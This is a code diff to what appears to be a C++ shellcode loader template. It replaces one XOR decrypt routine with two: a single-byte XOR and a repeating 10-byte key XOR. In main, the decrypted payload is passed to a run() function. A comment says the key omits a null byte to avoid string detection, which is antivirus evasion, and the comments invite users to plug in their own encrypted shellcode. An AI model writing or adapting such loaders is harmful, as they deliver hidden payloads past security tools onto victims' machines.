@@ -28,7 +28,8 @@ char* LAUNCH_COMMAND;
 
 // THE DECRYPT METHOD, THIS IS SOMETHING THAT NEEDS TO BE WRITTEN DEPENDING ON HOW YOUR SC IS GENERATED/ENCRYPTED
 // DECRYPT IN PLACE OR CREATE ANEW ONE, BUT RETURN IT EITHER WAY
-unsigned char* decrypt(unsigned char*, size_t);
+unsigned char* decryptKey(unsigned char*, size_t);
+unsigned char* decryptXOR(unsigned char*, size_t);
 
 // THE RUNNER METHOD, THIS IS PROVIDED
 void run(unsigned char*, size_t); 
@@ -86,7 +87,7 @@ int main(int argc, char** argv)
 	size_t bufLen = decodedBytes.length();
 
 	// DECRYPT THE BYTES
-	unsigned char* decr = decrypt(encryptedBytes, bufLen);
+	unsigned char* decr = decryptKey(encryptedBytes, bufLen);
 
 	// RUN THE SC
 	run(decr, bufLen);
@@ -96,9 +97,9 @@ int main(int argc, char** argv)
 }
 
 
-// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
-unsigned char* decrypt(unsigned char* encryptedBytes, size_t length) {
+unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {
 
+	if (DEBUG_MODE) cout << "Decrypting w/ bytewise XOR" << endl;
 	const unsigned char xKey = 35;
 
 	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
@@ -107,6 +108,36 @@ unsigned char* decrypt(unsigned char* encryptedBytes, size_t length) {
 		decrData[i] = encryptedBytes[i] ^ xKey;
 	}
 	decrData[length] = '\x00';
+	if (DEBUG_MODE) cout << "finished decryption" << endl;
+	return decrData;
+}
+
+// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
+unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
+
+	if (DEBUG_MODE) cout << "Decrypting with key..." << endl;
+
+	// NO NULL BYTE TO PREVENT STRING DETECTION
+	// KEY AND KEY LENGTH
+	char key[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'};
+	size_t keyLength = 10;
+
+	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
+
+	// i IS THE INDEX IN THE SC
+	// j IS THE INDEX IN THE KEY
+	size_t j = 0;
+	for (size_t i = 0; i < length; i++) {
+
+		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
+		if (j == keyLength) {
+			j = 0;
+		}
+		decrData[i] = encryptedBytes[i] ^ (unsigned char)key[j];
+		j++;
+	}
+	decrData[length] = '\x00';
+	if (DEBUG_MODE) cout << "Finished decrypting!" << endl;
 	return decrData;
 }
 
